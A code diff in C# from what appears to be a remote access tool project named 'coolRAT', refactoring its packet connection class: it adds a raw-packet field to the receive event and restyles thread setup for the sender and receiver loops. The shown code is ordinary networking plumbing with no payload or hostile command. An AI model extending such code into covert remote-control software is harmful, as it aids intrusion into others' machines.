@@ -8,10 +8,12 @@ namespace coolRAT.Libs.Connections
 {
     public class PacketReceivedEventArgs : EventArgs
     {
-        Packet Packet;
+        public readonly string RawPacket;
+        public readonly Packet Packet;
 
-        public PacketReceivedEventArgs(Packet packet)
+        public PacketReceivedEventArgs(string raw_packet, Packet packet)
         {
+            RawPacket = raw_packet;
             Packet = packet;
         }
     }
@@ -65,15 +67,17 @@ namespace coolRAT.Libs.Connections
                     continue;
                 }
 
-                PacketReceiverSubscriptions[packet.Type].Invoke(this, new PacketReceivedEventArgs(packet));
+                PacketReceiverSubscriptions[packet.Type].Invoke(this, new PacketReceivedEventArgs(packet_raw, packet));
             }
         }
 
         public void StartSender()
         {
             if (PacketSenderTh != null) if (PacketSenderTh.IsAlive) StopSender();
-            PacketSenderTh = new Thread(new ThreadStart(SenderLoop));
-            PacketSenderTh.IsBackground = true;
+            PacketSenderTh = new Thread(new ThreadStart(SenderLoop))
+            {
+                IsBackground = true
+            };
             PacketSenderTh.Start();
         }
 
@@ -87,8 +91,10 @@ namespace coolRAT.Libs.Connections
         public void StartReceiver()
         {
             if (PacketReceiverTh != null) if (PacketReceiverTh.IsAlive) StopReceiver();
-            PacketReceiverTh = new Thread(new ThreadStart(ReceiverLoop));
-            PacketReceiverTh.IsBackground = true;
+            PacketReceiverTh = new Thread(new ThreadStart(ReceiverLoop))
+            {
+                IsBackground = true
+            };
             PacketReceiverTh.Start();
         }
 
